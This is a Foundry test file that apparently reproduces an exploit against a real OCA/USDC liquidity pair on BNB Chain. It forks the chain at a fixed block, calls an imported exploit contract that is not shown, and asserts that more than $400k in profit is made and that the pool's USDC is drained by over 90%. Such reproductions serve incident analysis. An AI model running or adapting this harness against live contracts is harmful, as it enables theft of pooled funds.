// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/OCAExploit.sol";

interface IERC20Bal {
    function balanceOf(address) external view returns (uint256);
}

interface IPairReserves {
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract OCAExploitTest is Test {
    address constant USDC   = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address constant OCA    = 0xE0dAFD4592205067299A6ae269f68aa804f95419;
    address constant PAIR   = 0x5779bf44CD518B05651AE38fCc066247cCe21504;
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;

    OCAExploit exploitContract;

    function setUp() public {
        vm.createSelectFork("https://rpc.sentio.xyz/bsc", 81020477);
        exploitContract = new OCAExploit();
    }

    function exec() public {
        (uint112 r0Before, uint112 r1Before,) = IPairReserves(PAIR).getReserves();
        uint256 moolahUsdc = IERC20Bal(USDC).balanceOf(MOOLAH);

        emit log_named_decimal_uint("  USDC     ", uint256(r0Before), 18);
        emit log_named_decimal_uint("  OCA      ", uint256(r1Before), 18);
        emit log_named_decimal_uint("  Moolah USDC    ", moolahUsdc, 18);
        uint256 usdcBefore = IERC20Bal(USDC).balanceOf(address(this));

        exploitContract.exploit();

        uint256 usdcAfter = IERC20Bal(USDC).balanceOf(address(this));
        uint256 profit = usdcAfter - usdcBefore;
        (uint112 r0After, uint112 r1After,) = IPairReserves(PAIR).getReserves();

        emit log_named_decimal_uint("  USDC     ", uint256(r0After), 18);
        emit log_named_decimal_uint("  OCA      ", uint256(r1After), 18);
        emit log_named_decimal_uint("  USDC drained",
            uint256(r0Before) - uint256(r0After), 18);
        emit log_named_decimal_uint("  OCA drained",
            uint256(r1Before) - uint256(r1After), 18);
        emit log_named_decimal_uint("  USDC before     ", usdcBefore, 18);
        emit log_named_decimal_uint("  USDC after     ", usdcAfter, 18);
        emit log_named_decimal_uint("  >>> PROFIT     ", profit, 18);

        assertGt(profit, 0, "Exploit should be profitable");
        assertGt(profit, 400_000e18, "Profit should exceed ~$400k");
        assertLt(uint256(r0After), uint256(r0Before) / 10, "Pair USDC should be drained >90%");
    }

    receive() external payable {}
}
